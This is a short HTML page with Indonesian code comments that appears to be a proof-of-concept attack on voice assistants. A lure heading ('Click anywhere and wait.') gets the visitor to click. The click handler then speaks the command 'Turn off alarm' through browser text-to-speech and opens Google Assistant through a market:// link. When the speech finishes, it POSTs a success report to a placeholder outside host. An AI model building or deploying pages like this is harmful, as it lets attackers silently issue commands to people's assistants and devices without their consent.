<h1>Click anywhere and wait.</h1>

<script>
  onclick = () => {
    // Buat teks yang akan dibacakan
    const utterance = new SpeechSynthesisUtterance('Turn off alarm');
    speechSynthesis.speak(utterance);

    // Setelah selesai bicara, lakukan upload
    utterance.onend = () => {
      const data = { message: "Alarm turned off via TTS" };

      // Upload ke server dengan fetch
      fetch('https://example.com/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(res => console.log("Uploaded:", res.status))
      .catch(err => console.error("Upload error:", err));
    };

    // Membuka aplikasi Google Assistant di Android dengan market scheme
    window.location.href = 'market://launch?id=com.google.android.apps.googleassistant';
  };
</script>
